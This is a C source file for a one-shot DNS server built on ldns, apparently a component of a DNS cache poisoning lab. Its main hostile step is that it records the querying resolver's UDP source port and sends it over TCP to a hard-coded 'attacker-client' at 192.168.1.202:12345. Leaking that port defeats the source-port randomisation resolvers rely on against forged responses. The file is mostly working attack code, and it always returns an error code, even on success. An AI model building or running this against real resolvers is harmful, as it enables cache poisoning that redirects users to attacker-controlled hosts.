 #include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdint.h>

#include <ldns/ldns.h>

#define PORT 53
#define MAX_DNS_REQUEST_SIZE 128
#define ATTACKERS_CLIENT_IP "192.168.1.202"
#define ATTACKERS_CLIENT_PORT 12345
#define EXIT_ERROR 1

// ======================= helper functions =======================

static int get_port(struct sockaddr_in *client_addr, unsigned short *port)
{
    if (client_addr == NULL || port == NULL) {
        return 1;
    }
    *port = (unsigned short)ntohs(client_addr->sin_port);
    return 0;
}

/*
 * Send the observed port to the attacker-client (192.168.1.202:12345)
 * IMPORTANT: we keep the behavior of sending the raw unsigned short
 * in host byte order, as you requested.
 */
static int send_port_to_client(unsigned short port)
{
    int sock_fd;
    struct sockaddr_in client_addr;
    int attempt;
    memset(&client_addr, 0, sizeof(client_addr));
    client_addr.sin_family = AF_INET;
    client_addr.sin_addr.s_addr = inet_addr(ATTACKERS_CLIENT_IP);
    client_addr.sin_port = htons(ATTACKERS_CLIENT_PORT);

    /* try several times to avoid race if client is not yet listening */
    for (attempt = 0; attempt < 5; ++attempt) {
        sock_fd = socket(AF_INET, SOCK_STREAM, 0);
        if (sock_fd < 0) {
            return 1;
        }


        int opt = 1;
        if (setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
            close(sock_fd);
            return 1;
        }
        if (setsockopt(sock_fd, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
            close(sock_fd);
            return 1;
        }

        if (connect(sock_fd,
                    (struct sockaddr *)&client_addr,
                    (socklen_t)sizeof(client_addr)) == 0) {
            /* connected successfully */
            ssize_t bytes_sent = send(sock_fd, &port, sizeof(port), 0);
            if (bytes_sent == -1) {
                close(sock_fd);
                return 1;
            } else if ((size_t)bytes_sent != sizeof(port)) {
                close(sock_fd);
                return 1;
            }
            close(sock_fd);
            return 0;
        }

        /* connect failed, retry after short sleep */
        close(sock_fd);
        sleep(1);
    }
    return 1;
}

static ldns_pkt *receive_dns_request(int sockfd,
                                     struct sockaddr_in *client_addr,
                                     socklen_t *client_len)
{
    uint8_t buffer[MAX_DNS_REQUEST_SIZE];

    long int packet_bytes = recvfrom(sockfd,
                                     buffer,
                                     sizeof(buffer),
                                     0,
                                     (struct sockaddr *)client_addr,
                                     client_len);

    if (packet_bytes < 0) {
        return NULL;
    }

    ldns_pkt *request = NULL;
    ldns_status parsing_success =
        ldns_wire2pkt(&request, buffer, (size_t)packet_bytes);

    if (parsing_success != LDNS_STATUS_OK) {
        return NULL;
    }
    return request;
}

static ldns_pkt *create_dns_response(ldns_pkt *request)
{
    if (request == NULL) {
        return NULL;
    }

    ldns_pkt *dns_response = ldns_pkt_clone(request);
    if (dns_response == NULL) {
        return NULL;
    }

    return dns_response;
}

static int send_dns_response(int sockfd,
                              ldns_pkt *response,
                              struct sockaddr_in *client_addr,
                              socklen_t client_len)
{
    uint8_t *wire = NULL;
    size_t wire_len = 0U;
    ldns_status s = ldns_pkt2wire(&wire, response, &wire_len);
    if (s != LDNS_STATUS_OK) {
        return 1;
    }
    if (sendto(sockfd, wire, wire_len, 0, (struct sockaddr *)client_addr, client_len) < 0) {
        return 1;
    }
    free(wire);
    return 0;
}

static int handle_dns_request(int sockfd,
                              struct sockaddr_in *client_addr,
                              socklen_t client_len)
{
    unsigned short port = 0U;

    ldns_pkt *request =
        receive_dns_request(sockfd, client_addr, &client_len);

    if (request == NULL) {
        return 1;
    }

    if(get_port(client_addr, &port) != 0) {
        ldns_pkt_free(request);
        return 1;
    }

    ldns_pkt *response = create_dns_response(request);
    if (response == NULL) {
        ldns_pkt_free(request);
        return 1;
    }

    /* Send DNS response back to resolver so it doesn't retry forever */
    if (send_dns_response(sockfd, response, client_addr, client_len) != 0) {
        ldns_pkt_free(response);
        ldns_pkt_free(request);
        return 1;
    }

    /* Now send the observed source port to attacker-client */
    if (send_port_to_client(port) != 0) {
        ldns_pkt_free(response);
        ldns_pkt_free(request);    
        return 1;
    }

    ldns_pkt_free(response);
    ldns_pkt_free(request);

    return 1;
}

// ======================= main =======================

int main(void)
{
    int sockfd;
    struct sockaddr_in servaddr;
    struct sockaddr_in client_addr;
    socklen_t client_len;

    /* Create UDP socket for DNS */
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        exit(1);
    }

    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
    servaddr.sin_port = htons(PORT);

    if (bind(sockfd, (struct sockaddr *)&servaddr, (socklen_t)sizeof(servaddr)) < 0) {
        close(sockfd);
        exit(1);
    }
    memset(&client_addr, 0, sizeof(client_addr));
    client_len = (socklen_t)sizeof(client_addr);

    /* one-shot: handle a single DNS request from resolver */
    int err = handle_dns_request(sockfd, &client_addr, client_len);

    close(sockfd);
    return err;
}
